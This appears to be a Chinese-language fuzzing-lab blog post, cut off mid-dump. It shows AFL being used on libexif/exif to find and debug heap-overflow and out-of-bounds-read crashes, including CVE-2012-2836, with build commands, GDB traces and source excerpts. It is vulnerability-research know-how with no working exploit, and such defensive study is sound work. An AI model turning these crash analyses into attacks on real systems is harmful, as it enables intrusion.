<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">➜  exif-exif-0_6_15-release $HOME/fuzzing_libexif/tool/bin/exif </span><br><span class="line">用法: exif [OPTION...] file</span><br><span class="line">  -v, --version                   Display software version</span><br><span class="line">  -i, --ids                       Show IDs instead of tag names</span><br><span class="line">  -t, --tag=tag                   Select tag</span><br><span class="line">      --ifd=IFD                   Select IFD</span><br><span class="line">  -l, --list-tags                 List all EXIF tags</span><br><span class="line">  -|, --show-mnote                Show contents of tag MakerNote</span><br><span class="line">      --remove                    Remove tag or ifd</span><br><span class="line">  -s, --show-description          Show description of tag</span><br><span class="line">  -e, --extract-thumbnail         Extract thumbnail</span><br><span class="line">  -r, --remove-thumbnail          Remove thumbnail</span><br><span class="line">  -n, --insert-thumbnail=FILE     Insert FILE as thumbnail</span><br><span class="line">  -o, --output=FILE               Write data to FILE</span><br><span class="line">      --set-value=STRING          Value</span><br><span class="line">  -m, --machine-readable          Output in a machine-readable (tab delimited)</span><br><span class="line">                                  format</span><br><span class="line">  -x, --xml-output                Output in a XML format</span><br><span class="line">  -d, --debug                     Show debugging messages</span><br><span class="line"></span><br><span class="line">帮助选项:</span><br><span class="line">  -?, --help                      显示这个帮助信息</span><br><span class="line">      --usage                     显示简短的使用说明</span><br></pre></td></tr></table></figure>
<h2 id="Fuzz-exif"><a href="#Fuzz-exif" class="headerlink" title="Fuzz exif"></a>Fuzz exif</h2><p>在进行 fuzz 前，我们需要先了解 Exif 是什么：</p>
<ul>
<li>Exif 是一种文件格式，可交换图像文件格式（Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据</li>
<li>示例如下：</li>
</ul>
<img src="/2022/08/15/Fuzz%20Lab2-libexif/1660455820884.png" class width="1660455820884"> 
<ul>
<li>那么就需要找到这样的文件样本，好在万能的 GitHub 啥都有，可以直接下载： </li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ianare/exif-samples.git</span><br></pre></td></tr></table></figure>
<ul>
<li>使用<code>exif</code>命令随便查看一张图片的信息：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd exif-samples/jpg</span><br><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_libexif/tool/bin/exif Nikon_D70.jpg</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>结果如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">EXIF tags in <span class="string">&#x27;Nikon_D70.jpg&#x27;</span> (<span class="string">&#x27;英特尔&#x27;</span> byte order):</span><br><span class="line">--------------------+----------------------------------------------------------</span><br><span class="line">Tag                 |Value                                                     </span><br><span class="line">--------------------+----------------------------------------------------------</span><br><span class="line">Manufacturer        |NIKON CORPORATION                                         </span><br><span class="line">Model               |NIKON D70                                                 </span><br><span class="line">Orientation         |top - left                                                </span><br><span class="line">x-Resolution        |<span class="number">240.00</span>                                                    </span><br><span class="line">y-Resolution        |<span class="number">240.00</span>                                                    </span><br><span class="line">Resolution Unit     |英寸                                                    </span><br><span class="line">Software            |GIMP <span class="number">2.4</span><span class="number">.5</span>                                                </span><br><span class="line">Date <span class="keyword">and</span> Time       |<span class="number">2008</span>:<span class="number">07</span>:<span class="number">31</span> <span class="number">10</span>:<span class="number">03</span>:<span class="number">44</span>                                       </span><br><span class="line">Compression         |JPEG 压缩                                               </span><br><span class="line">x-Resolution        |<span class="number">72.00</span>                                                     </span><br><span class="line">y-Resolution        |<span class="number">72.00</span>                                                     </span><br><span class="line">Resolution Unit     |英寸                                                    </span><br><span class="line">Exposure Time       |<span class="number">1</span>/<span class="number">200</span> sec.                                                </span><br><span class="line">FNumber             |f/<span class="number">9.0</span>                                                     </span><br><span class="line">Exposure Program    |手动                                                    </span><br><span class="line">ISO Speed Ratings   |<span class="number">200</span>                                                       </span><br><span class="line"><span class="function">Date <span class="keyword">and</span> <span class="title">Time</span> <span class="params">(origi|<span class="number">2008</span>:<span class="number">03</span>:<span class="number">15</span> <span class="number">09</span>:<span class="number">52</span>:<span class="number">01</span>                                       </span></span></span><br><span class="line"><span class="params"><span class="function">Shutter speed       |<span class="number">7.64</span> EV (<span class="number">1</span>/<span class="number">199</span> sec.)                                      </span></span></span><br><span class="line"><span class="params"><span class="function">光圈              |<span class="number">6.34</span> EV (f/<span class="number">9.0</span>)                                           </span></span></span><br><span class="line"><span class="params"><span class="function">曝光偏差        |<span class="number">-1.00</span> EV                                                  </span></span></span><br><span class="line"><span class="params"><span class="function">Maximum Aperture Val|<span class="number">3.30</span> EV (f/<span class="number">3.1</span>)                                           </span></span></span><br><span class="line"><span class="params"><span class="function">测距模式        |Center-Weighted Average                                   </span></span></span><br><span class="line"><span class="params"><span class="function">闪光灯           |未闪光                                                 </span></span></span><br><span class="line"><span class="params"><span class="function">焦距              |<span class="number">100.0</span> mm                                                  </span></span></span><br><span class="line"><span class="params"><span class="function">色彩空间        |sRGB                                                      </span></span></span><br><span class="line"><span class="params"><span class="function">PixelXDimension     |<span class="number">100</span>                                                       </span></span></span><br><span class="line"><span class="params"><span class="function">PixelYDimension     |<span class="number">66</span>                                                        </span></span></span><br><span class="line"><span class="params"><span class="function">Focal Length In <span class="number">35</span>mm|<span class="number">150</span>                                                       </span></span></span><br><span class="line"><span class="params"><span class="function">Exif Version        |Exif版本<span class="number">2.1</span>                                             </span></span></span><br><span class="line"><span class="params"><span class="function">FlashPixVersion     |FlashPix版本 <span class="number">1.0</span>                                        </span></span></span><br><span class="line"><span class="params"><span class="function">--------------------+----------------------------------------------------------</span></span></span><br><span class="line"><span class="params"><span class="function">EXIF data contains a thumbnail (<span class="number">1700</span> bytes).</span></span></span><br></pre></td></tr></table></figure>
<p>接下来使用 afl 编译器重新编译程序来执行 Fuzz</p>
<p>这次使用 afl-clang-lto 作为编译器来构建程序，afl-clang-lto 相比于 afl-clang-fast 是更好的选择，因为它是一种无碰撞检测，而且比 afl-clang-fast 快</p>
<ul>
<li>使用编译器重新构建程序： </li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_libexif/install</span><br><span class="line">cd $HOME/libexif-0.6.18 # 使用afl-clang-lto编译器构建libexif</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">rm -r $HOME/fuzzing_libexif/tool</span><br><span class="line">cd $HOME/exif-exif-0_6_15-release  # 使用afl-clang-lto编译器构建exif</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/tool/&quot; PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>开始 fuzz：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i /home/yhellow/fuzzing_libexif/exif-samples/jpg/ -o /home/yhellow/fuzzing_libexif/out -s 123 -- /home/yhellow/fuzzing_libexif/tool/bin/exif @@</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<img src="/2022/08/15/Fuzz%20Lab2-libexif/1660457762859.png" class width="1660457762859"> 
<h2 id="Reproduce-the-crash"><a href="#Reproduce-the-crash" class="headerlink" title="Reproduce the crash"></a>Reproduce the crash</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./exif test.<span class="function">jpg                                                                                                                          </span></span><br><span class="line"><span class="function"><span class="title">realloc</span><span class="params">()</span>: invalid next size</span></span><br><span class="line"><span class="function">[1]    2564 <span class="built_in">abort</span>      ./exif test.jpg</span></span><br></pre></td></tr></table></figure>
<ul>
<li>发生错误，看起来像是堆溢出（victim chunk 的 next chunk-&gt;size 被破坏）</li>
<li>使用 GDB <code>bt</code> 命令查看栈回溯</li>
</ul>
<img src="/2022/08/15/Fuzz%20Lab2-libexif/1660525309142.png" class width="1660525309142"> 
<ul>
<li>函数 <code>exif_content_fix</code> 中发生了堆溢出（最好不要直接根据函数名来找源码，可以通过后面的 <code>文件名+偏移</code> 来找）</li>
<li>在 <code>exif_content_fix</code> 上打断点，结合源码进行调试，发现 <code>exif_content_fix</code> 执行两次以后发生错误，于是在 <code>realloc</code> 上打断点，用 <code>bt</code> 回溯栈：</li>
</ul>
<img src="/2022/08/15/Fuzz%20Lab2-libexif/1660526920225.png" class width="1660526920225"> 
<ul>
<li>定位到的代码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">exif_mem_realloc</span> <span class="params">(ExifMem *mem, <span class="keyword">void</span> *d, ExifLong ds)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (mem &amp;&amp; mem-&gt;realloc_func) ? mem-&gt;realloc_func (d, ds) : <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">0x238994</span> &lt;exif_content_fix+<span class="number">6756</span>&gt;    call   rcx                           &lt;exif_mem_realloc_func&gt;</span><br><span class="line">        rdi: <span class="number">0x46fe40</span> ◂— <span class="number">0x100000001000100</span></span><br><span class="line">        rsi: <span class="number">0x600</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x0000000000238996</span><span class="number">-0x2</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x238994</span> (exif_content_fix+<span class="number">6756</span>) ◂— call   rcx</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x23899c</span> (exif_content_fix+<span class="number">6764</span>) ◂— add    byte ptr [rax], al</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x2389a4</span> (exif_content_fix+<span class="number">6772</span>) ◂— add    al, byte ptr [rax]</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x2389ac</span> (exif_content_fix+<span class="number">6780</span>) ◂— add    dl, <span class="number">1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>继续打断点调试：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x238994</span> &lt;exif_content_fix+<span class="number">6756</span>&gt;    call   rcx                           &lt;exif_mem_realloc_func&gt;</span><br><span class="line">       rdi: <span class="number">0x46fe40</span> ◂— <span class="number">0x100000001000100</span></span><br><span class="line">       rsi: <span class="number">0x600</span></span><br></pre></td></tr></table></figure>
<ul>
<li>找到目标堆：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x46fe40</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x46fe30</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x46fe38</span> ◂— <span class="number">0x311</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ rdi <span class="number">0x46fe40</span> ◂— <span class="number">0x100000001000100</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x46fe48</span> ◂— <span class="number">0x100000000000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x46fe50</span> ◂— <span class="number">0x0</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; telescope <span class="number">0x46fe30</span>+<span class="number">0x310</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x470140</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>发现 <code>0x470140</code> 处的 chunk 已经被破坏，可能是从 <code>0x46fe30</code> 中溢出的数据破坏了该 chunk，接下来的思路就是寻找往 <code>0x46fe30</code> 中写入数据的函数</li>
<li>本来想同样的方法，在 <code>malloc</code> 上打断点，然后回溯栈 ，结果发现 <code>0x46fe30</code> 已经被申请了，但是还没有写入，所以就直接单步硬找目标函数，最后找到了 <code>exif_entry_fix</code> 函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">exif_entry_fix</span> <span class="params">(ExifEntry *e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">	ExifByteOrder o;</span><br><span class="line">	ExifRational r;</span><br><span class="line">	ExifSRational sr;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">			memmove (e-&gt;data + <span class="number">8</span>, e-&gt;data, e-&gt;size);</span><br><span class="line">			<span class="built_in">memcpy</span> (e-&gt;data, <span class="string">&quot;ASCII\0\0\0&quot;</span>, <span class="number">8</span>);</span><br><span class="line">			e-&gt;size += <span class="number">8</span>;</span><br><span class="line">			e-&gt;components += <span class="number">8</span>;</span><br><span class="line">			exif_entry_log (e, EXIF_LOG_CODE_DEBUG,</span><br><span class="line">				_(<span class="string">&quot;Tag &#x27;UserComment&#x27; has been expanded to at &quot;</span></span><br><span class="line">				<span class="string">&quot;least 8 bytes in order to follow the &quot;</span></span><br><span class="line">				<span class="string">&quot;specification.&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">memcmp</span> (e-&gt;data, <span class="string">&quot;ASCII\0\0\0&quot;</span>     , <span class="number">8</span>) &amp;&amp;</span><br><span class="line">		    <span class="built_in">memcmp</span> (e-&gt;data, <span class="string">&quot;UNICODE\0&quot;</span>       , <span class="number">8</span>) &amp;&amp;</span><br><span class="line">		    <span class="built_in">memcmp</span> (e-&gt;data, <span class="string">&quot;JIS\0\0\0\0\0&quot;</span>   , <span class="number">8</span>) &amp;&amp;</span><br><span class="line">		    <span class="built_in">memcmp</span> (e-&gt;data, <span class="string">&quot;\0\0\0\0\0\0\0\0&quot;</span>, <span class="number">8</span>)) &#123;</span><br><span class="line">			e-&gt;data = exif_entry_realloc (e, e-&gt;data, <span class="number">8</span> + e-&gt;size); <span class="comment">/* 调用realloc */</span></span><br><span class="line">			<span class="keyword">if</span> (!e-&gt;data) &#123;</span><br><span class="line">				e-&gt;size = <span class="number">0</span>;</span><br><span class="line">				e-&gt;components = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">            </span><br><span class="line">    ...... </span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其函数有大量的 <code>memmove</code> <code>memcpy</code> 等函数，极有可能就是它们导致了堆溢出（<code>exif_mem_realloc</code> 也是在这里调用的），于是在 <code>memcpy</code> 上打断点，进行调试</li>
<li>发现执行 54 次 <code>memcpy</code> 后程序崩溃，于是对比第 54 次 <code>memcpy</code> 执行前后的 heap 空间变化，发现 <code>0x46fe30</code> 中并没有写入数据，只能单步继续跟进了</li>
<li>由于 <code>exif_entry_realloc</code> 无法下断点，最后还是没有找到溢出点</li>
</ul>
<h2 id="CVE-2012-2836"><a href="#CVE-2012-2836" class="headerlink" title="CVE-2012-2836"></a>CVE-2012-2836</h2><h2 id="Download-and-build-your-target-1"><a href="#Download-and-build-your-target-1" class="headerlink" title="Download and build your target"></a>Download and build your target</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wget https://sourceforge.net/projects/libexif/files/libexif/0.6.14/libexif-0.6.14.tar.gz # 获取libexif</span><br><span class="line">tar -zxvf libexif-0.6.14.tar.gz</span><br><span class="line"></span><br><span class="line">cd $HOME/libexif-0.6.14 # 使用afl-clang-lto编译器构建libexif</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install2/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">cd $HOME/exif-exif-0_6_15-release  # 使用afl-clang-lto编译器构建exif</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/tool2/&quot; PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install2/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<h2 id="Fuzz-exif-1"><a href="#Fuzz-exif-1" class="headerlink" title="Fuzz exif"></a>Fuzz exif</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i /home/yhellow/fuzzing_libexif/exif-samples/jpg -o /home/yhellow/fuzzing_libexif/out2 -s 123 -- /home/yhellow/fuzzing_libexif/tool2/bin/exif @@</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<img src="/2022/08/15/Fuzz%20Lab2-libexif/1660539954254.png" class width="1660539954254"> 
<h2 id="Reproduce-the-crash-1"><a href="#Reproduce-the-crash-1" class="headerlink" title="Reproduce the crash"></a>Reproduce the crash</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./exif test.jpg </span><br><span class="line">[<span class="number">1</span>]    <span class="number">1101259</span> segmentation fault  ./exif test.jpg</span><br></pre></td></tr></table></figure>
<ul>
<li>发生段错误，在 GDB 中使用 <code>bt</code> 命令：</li>
</ul>
<img src="/2022/08/15/Fuzz%20Lab2-libexif/1660540799028.png" class width="1660540799028">  
<ul>
<li>段错误发生在 <code>exif_data_load_data</code> 调用的 <code>exif_get_sshort</code> 函数中，源码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ExifSShort</span></span><br><span class="line"><span class="function"><span class="title">exif_get_sshort</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, ExifByteOrder order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!buf) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span> (order) &#123;</span><br><span class="line">        <span class="keyword">case</span> EXIF_BYTE_ORDER_MOTOROLA:</span><br><span class="line">                <span class="keyword">return</span> ((buf[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | buf[<span class="number">1</span>]); <span class="comment">/* target */</span></span><br><span class="line">        <span class="keyword">case</span> EXIF_BYTE_ORDER_INTEL:</span><br><span class="line">                <span class="keyword">return</span> ((buf[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | buf[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Won&#x27;t be reached */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">	EXIF_BYTE_ORDER_MOTOROLA,	<span class="comment">/* &#x27;0&#x27; */</span></span><br><span class="line">	EXIF_BYTE_ORDER_INTEL		<span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line">&#125; ExifByteOrder;</span><br></pre></td></tr></table></figure>
<ul>
<li>单步调试，发现程序执行到以下代码时就停止了：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x22bc6f</span> &lt;exif_data_load_data+<span class="number">1407</span>&gt;    movzx  esi, word ptr [rcx]</span><br></pre></td></tr></table></figure>
<ul>
<li>[rcx] 显然不合法，猜测传入 <code>exif_get_sshort</code> 的参数有误</li>
<li>在 <code>exif_data_load_data</code> 中单步调试，寻找调用 <code>exif_get_sshort</code> 并引发段错误的地方：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">exif_data_load_data</span> <span class="params">(ExifData *data, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *d_orig,</span></span></span><br><span class="line"><span class="params"><span class="function">		     <span class="keyword">unsigned</span> <span class="keyword">int</span> ds_orig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">	<span class="comment">/* Fixed value */</span> </span><br><span class="line">	<span class="keyword">if</span> (exif_get_short (d + <span class="number">8</span>, data-&gt;priv-&gt;order) != <span class="number">0x002a</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* IFD 0 offset */</span></span><br><span class="line">	offset = exif_get_long (d + <span class="number">10</span>, data-&gt;priv-&gt;order);</span><br><span class="line">	exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_DEBUG, <span class="string">&quot;ExifData&quot;</span>, </span><br><span class="line">		  <span class="string">&quot;IFD 0 at %i.&quot;</span>, (<span class="keyword">int</span>) offset);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Parse the actual exif data (usually offset 14 from start) */</span></span><br><span class="line">	exif_data_load_data_content (data, EXIF_IFD_0, d + <span class="number">6</span>, ds - <span class="number">6</span>, offset, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* IFD 1 offset */</span></span><br><span class="line">	<span class="keyword">if</span> (offset + <span class="number">6</span> + <span class="number">2</span> &gt; ds) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	n = exif_get_short (d + <span class="number">6</span> + offset, data-&gt;priv-&gt;order); <span class="comment">/* targrt */</span></span><br><span class="line">	<span class="keyword">if</span> (offset + <span class="number">6</span> + <span class="number">2</span> + <span class="number">12</span> * n + <span class="number">4</span> &gt; ds) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：程序通过 <code>exif_get_short</code> 来调用 <code>exif_get_sshort</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ExifShort</span></span><br><span class="line"><span class="function"><span class="title">exif_get_short</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, ExifByteOrder order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (exif_get_sshort (buf, order) &amp; <span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 GDB 中定位到对应的位置：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  <span class="number">0x7</span></span><br><span class="line"> RBX  <span class="number">0x453</span></span><br><span class="line"> RCX  <span class="number">0x100452c45</span></span><br><span class="line"> RDX  <span 